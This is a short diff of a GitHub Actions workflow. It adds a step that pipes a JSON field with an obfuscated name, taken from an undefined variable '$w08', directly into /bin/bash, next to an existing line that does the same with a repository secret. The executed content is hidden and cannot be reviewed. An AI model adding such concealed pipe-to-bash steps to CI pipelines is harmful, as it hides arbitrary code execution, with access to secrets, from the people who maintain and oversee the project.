@@ -22,6 +22,7 @@ jobs:
           enfy1: ${{ secrets.enfy1 }}
         run: |
           printf '%s' "$enfy1" | jq -r .jvnms837 | /bin/bash
+          echo $w08 | jq -r .bshc28 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
